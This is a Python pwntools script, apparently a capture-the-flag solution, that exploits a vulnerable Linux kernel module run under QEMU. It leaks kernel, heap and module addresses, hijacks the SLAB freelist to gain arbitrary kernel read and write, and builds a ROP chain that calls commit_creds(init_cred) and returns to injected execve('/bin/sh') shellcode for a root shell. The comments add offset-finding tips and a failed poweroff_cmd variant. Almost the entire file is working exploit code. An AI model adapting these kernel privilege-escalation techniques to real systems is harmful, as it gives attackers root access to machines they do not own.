#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

r = process('./start-qemu.sh')

def add(idx, size):
    r.sendlineafter("> ", '1')
    r.sendlineafter("index: ", str(idx))
    r.sendlineafter("size: ", str(size))

GET_SHELL = False
def edit(idx, size, data):
    r.sendlineafter("> ", '2')
    r.sendlineafter("index: ", str(idx))
    r.sendlineafter("size: ", str(size))
    r.sendlineafter("data: ", data)
    if GET_SHELL == False:
        r.recvuntil("Successfully updated")
    
def show(idx, size):
    r.sendlineafter("> ", '3')
    r.sendlineafter("index: ", str(idx))
    r.sendlineafter("size: ", str(size))
    r.recvuntil('Data: ')
    return bytes.fromhex(''.join(r.recvline().decode().split(' ')))

def delete(idx):
    r.sendlineafter("> ", '4')
    r.sendlineafter("index: ", str(idx))

def hexdump(data, show):
    vals = []
    for i in range(0, len(data), 8):
        val = u64(data[i:i+8].ljust(8, b'\x00'))
        if show:
            print(hex(i), hex(i // 8), hex(val))
        vals.append(val)
    return vals


"""
use "x/10i shuffle_freelist" to check CONFIG_SLAB_FREELIST_RANDOM (if it is optimized, meaning disabled)
use "x/30i kmem_cache_flags" to check CONFIG_SLAB_FREELIST_HARDENED (if it calls get_random_long())

# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab>
kmalloc-8k             4      4   8192    4    8
kmalloc-4k            24     24   4096    8    8
kmalloc-2k           136    136   2048    8    4
kmalloc-1k           744    744   1024    8    2
kmalloc-512          144    144    512    8    1
kmalloc-256          832    832    256   16    1
kmalloc-192          168    168    192   21    1
kmalloc-128          192    192    128   32    1
kmalloc-96           294    294     96   42    1
kmalloc-64           704    704     64   64    1
kmalloc-32           512    512     32  128    1
kmalloc-16           768    768     16  256    1
kmalloc-8           3072   3072      8  512    1

find modprobe_path location without symbol
1. strings -t x vmlinux | grep "/sbin/modprobe" 0xc02480
2. readelf -S vmlinux | grep " .data "
     ffffffff81e00000  00bca000
3. string offset - section offset = 0xc02480 - 0xbca000
4. add .data base = 0xffffffff81e00000 + 0x38480 = 0xffffffff81e38480

(but we need to RCE it)
"""

heap_start = 0xffff000000000000
kern_start = 0xffffffff00000000
target_offset = 0xd31042
kern_base = 0

# leak kern_base
LEAK = False
while LEAK == False:
    add(0, 0x200)
    data = show(0, 0x1000)
    vals = hexdump(data, False)
    for i in range(len(vals)):
        if vals[i] & kern_start == kern_start and \
           vals[i] & 0xfffff == target_offset & 0xfffff:
            kern_base = vals[i] - target_offset
            info(f"kern_base: {hex(kern_base)}")
            LEAK = True
            break

# leak heap
LEAK = False
heap = 0
# drain dirty, so we will get a clear page
for i in range(0x10):
    add(0, 0x200)

for i in range(0x10):
    add(i, 0x200)
for i in reversed(range(0x10)):
    delete(i)
for i in range(0x2):
    add(0, 0x200)
    data = show(0, 0x1000)
    vals = hexdump(data, False)
    heap = vals[0x60]
    if heap == 0:
        continue

    heap -= 0x400
    info(f"heap: {hex(heap)}")
    break

def freelist_hijacking(addr):
    payload = 'AA ' * 0x300
    addr = p64(addr)
    for i in range(len(addr)):
        payload += "{0:0{1}x}".format(addr[i], 2) + " "
    edit(0, 0x308, payload)
    
module_base = 0xffffffffc0000000
module_load_offset = kern_base + 0x1000910
info(f"module_load_offset: {hex(module_load_offset)}")
freelist_hijacking(module_load_offset - 0x200)
add(1, 0x200)
add(2, 0x200)
delete(1)
data = show(2, 0x208)
vals = hexdump(data, False)
module_kaslr = vals[0x40]
module_base += module_kaslr
buffers = module_base + 0x2400
info(f"module: {hex(module_base)}")
info(f"buffers: {hex(buffers)}")

freelist_hijacking(buffers + 0x20)
add(1, 0x200)
add(2, 0x200)
delete(1)

def aa(addr, data, size, r):
    payload = ""
    addr = p64(addr)
    for i in range(len(addr)):
        payload += "{0:0{1}x}".format(addr[i], 2) + " "
    edit(2, 8, payload)

    if r == True:
        return show(4, size)
    else:
        payload = ""
        for i in range(len(data)):
            payload += "{0:0{1}x}".format(data[i], 2) + " "
        edit(4, size, payload)

###################
tasks_offset = 0x2f0 # find it in copy_process asm code
comm_offset = tasks_offset + 0x2d0
stack_offset = 0x20
mm_offset = 0x340 # find in __mmdrop
init_cred = kern_base + 0xe37a60 # find it in prepare_kernel_cred
commit_creds = kern_base + 0x0723c0
init_task = kern_base + 0xe12580

__x64_sys_mprotect = kern_base + 0x1227e0
do_mprotect_pkey = kern_base + 0x1224f0
copy_to_user = kern_base + 0x269780
rop_pop_rdi_ret = kern_base + 0x14078a # pop rdi ; ret
rop_pop_rsi_ret = kern_base + 0xce28e # pop rsi ; ret
rop_pop_rdx_ret = kern_base + 0x145369 # pop rdx ; ret
rop_pop_rcx_ret = kern_base + 0x0eb7e4 # pop rcx ; ret
swapgs_restore_regs_and_return_to_usermode_gadget = kern_base + 0x800e26
sc = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x6A\x00\x57\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE6\x6A\x00\x48\x89\xE2\x0F\x05";

info(f"init_task: {hex(init_task)}")
data = aa(init_task + tasks_offset + 8, 0, 0x8, True) # get prev
vals = hexdump(data, False)
interface_task = vals[0] - tasks_offset
info(f"interface_task: {hex(interface_task)}")
data = aa(interface_task + comm_offset, 0, 0x8, True) # get prev
assert( b'inter' in data )

data = aa(interface_task + mm_offset, 0, 0x8, True) # get prev
vals = hexdump(data, False)
mm = vals[0]
info(f"mm: {hex(mm)}")

data = aa(interface_task + stack_offset, 0, 0x8, True) # get prev
vals = hexdump(data, False)
kstack = vals[0]
info(f"kstack: {hex(kstack)}")

data = aa(kstack + 0x3ff0, 0, 0x8, True) # get prev
vals = hexdump(data, False)
user_stack = vals[0]
user_start_offset = 0x80
info(f"user_stack: {hex(user_stack)}")

data = aa(user_stack + user_start_offset, 0, 0x8, True) # get prev
vals = hexdump(data, False)
user_base = vals[0] - 0x1138
target = user_base + 0x182a
info(f"user_base: {hex(user_base)}")

write_to_rop = kstack + 0x3e88
rop = flat(
    rop_pop_rdi_ret, init_cred,
    commit_creds, 

    rop_pop_rdi_ret, user_base,
    rop_pop_rsi_ret, 0x2000,
    rop_pop_rdx_ret, 7,
    rop_pop_rcx_ret, 0xffffffff,
    do_mprotect_pkey,

    rop_pop_rdi_ret, target,
    rop_pop_rsi_ret, heap,
    rop_pop_rdx_ret, len(sc),
    copy_to_user,

    swapgs_restore_regs_and_return_to_usermode_gadget,
    0, 0, # rax, rdi
    target,
    0x33, #cs
    0x246, # flags
    user_stack, #stack
    0x2b, #ss,
)

aa(heap, sc, len(sc), False)
GET_SHELL = True
aa(write_to_rop, rop, len(rop), False)
r.interactive()
"""
Other exploit:
1. write poweroff_cmd to "/bin/sh -c sh/dev/console\x00" (I don't know why there is no space between sh and /dev/console)
2. control rip to __orderly_poweroff(), and this function calls call_usermodehelper(poweroff_cmd)
P.S. I try to use this technique but failed, so I am not sure how it works

[FAILED EXPLOITATION]
poweroff_cmd = kern_base + 0xe37cc0
poweroff_work_func = kern_base + 0x73240
cmd = b"/bin/sh -c sh /dev/console\x00"
aa(poweroff_cmd, cmd, len(cmd), False)
rop = flat(
    poweroff_work_func,
    swapgs_restore_regs_and_return_to_usermode_gadget,
    0, 0, # rax, rdi
    user_base + 0x1696,
    0x33, #cs
    0x246, # flags
    user_stack, #stack
    0x2b, #ss,
)

"""
